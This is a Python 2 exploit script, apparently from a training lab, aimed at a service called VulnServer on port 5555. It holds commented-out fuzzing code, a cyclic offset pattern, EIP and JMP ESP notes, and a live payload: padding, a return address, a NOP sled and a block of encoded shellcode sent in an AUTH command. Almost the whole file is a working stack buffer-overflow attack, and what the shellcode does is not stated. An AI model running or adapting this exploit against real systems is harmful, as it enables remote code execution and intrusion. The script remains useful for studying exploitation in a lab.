#!/usr/bin/python
import socket
import time,struct,sys

#python vulnserverfuzzer.py [ip: 10.11.25.61]

# Create an array of buffers, from 1 to 5900, with increments of 200.
"""buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200
"""

#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"

shellcode = ("\xdb\xd0\xbd\xd9\x5e\xbf\x63\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x6f\x17\x03\x6f\x17\x83\x1e\x5a\x5d\x96\x5c\x8b\x23"
"\x59\x9c\x4c\x44\xd3\x79\x7d\x44\x87\x0a\x2e\x74\xc3\x5e\xc3"
"\xff\x81\x4a\x50\x8d\x0d\x7d\xd1\x38\x68\xb0\xe2\x11\x48\xd3"
"\x60\x68\x9d\x33\x58\xa3\xd0\x32\x9d\xde\x19\x66\x76\x94\x8c"
"\x96\xf3\xe0\x0c\x1d\x4f\xe4\x14\xc2\x18\x07\x34\x55\x12\x5e"
"\x96\x54\xf7\xea\x9f\x4e\x14\xd6\x56\xe5\xee\xac\x68\x2f\x3f"
"\x4c\xc6\x0e\x8f\xbf\x16\x57\x28\x20\x6d\xa1\x4a\xdd\x76\x76"
"\x30\x39\xf2\x6c\x92\xca\xa4\x48\x22\x1e\x32\x1b\x28\xeb\x30"
"\x43\x2d\xea\x95\xf8\x49\x67\x18\x2e\xd8\x33\x3f\xea\x80\xe0"
"\x5e\xab\x6c\x46\x5e\xab\xce\x37\xfa\xa0\xe3\x2c\x77\xeb\x6b"
"\x80\xba\x13\x6c\x8e\xcd\x60\x5e\x11\x66\xee\xd2\xda\xa0\xe9"
"\x15\xf1\x15\x65\xe8\xfa\x65\xac\x2f\xae\x35\xc6\x86\xcf\xdd"
"\x16\x26\x1a\x71\x46\x88\xf5\x32\x36\x68\xa6\xda\x5c\x67\x99"
"\xfb\x5f\xad\xb2\x96\x9a\x26\xb7\x6d\xa4\x3c\xaf\x73\xa4\x51"
"\x6c\xfd\x42\x3b\x9c\xab\xdd\xd4\x05\xf6\x95\x45\xc9\x2c\xd0"
"\x46\x41\xc3\x25\x08\xa2\xae\x35\xfd\x42\xe5\x67\xa8\x5d\xd3"
"\x0f\x36\xcf\xb8\xcf\x31\xec\x16\x98\x16\xc2\x6e\x4c\x8b\x7d"
"\xd9\x72\x56\x1b\x22\x36\x8d\xd8\xad\xb7\x40\x64\x8a\xa7\x9c"
"\x65\x96\x93\x70\x30\x40\x4d\x37\xea\x22\x27\xe1\x41\xed\xaf"
"\x74\xaa\x2e\xa9\x78\xe7\xd8\x55\xc8\x5e\x9d\x6a\xe5\x36\x29"
"\x13\x1b\xa7\xd6\xce\x9f\xc7\x34\xda\xd5\x6f\xe1\x8f\x57\xf2"
"\x12\x7a\x9b\x0b\x91\x8e\x64\xe8\x89\xfb\x61\xb4\x0d\x10\x18"
"\xa5\xfb\x16\x8f\xc6\x29")

buffer = "A"*1040 + '\x71\x1d\xd1\x65' + "\x90" * 16  + shellcode + "C"*(1425-1040-4-351-16)

#print(buffer)

"""for string in buffer:
    print "Fuzzing PASS with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((sys.argv[1],5555))
    s.recv(1024)
    s.send("AUTH " + string)
    s.close()"""

#EIP: 37694236
#VulnServer.exe, JMP ESP: 0x65d11d71 --> \x71\x1d\xd1\x65

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],5555))
s.recv(1024)
s.send("AUTH " + buffer)
s.close()
